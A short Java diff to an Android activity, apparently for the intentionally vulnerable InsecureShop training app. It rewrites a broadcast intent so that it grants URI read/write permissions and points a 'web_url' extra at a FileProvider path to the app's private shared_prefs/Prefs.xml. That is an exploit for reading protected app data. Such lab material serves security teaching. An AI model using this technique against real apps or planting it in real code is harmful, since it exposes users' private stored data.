@@ -22,7 +22,8 @@ public class MainActivity extends AppCompatActivity {
     }
     public void sendDelayBroadcast(){
         Intent broadcast = new Intent("com.insecureshop.CUSTOM_INTENT");
-        broadcast.putExtra("web_url","https://www.google.com");
+        broadcast.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
+        broadcast.putExtra("web_url","content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml");
         sendBroadcast(broadcast);
     }
 }
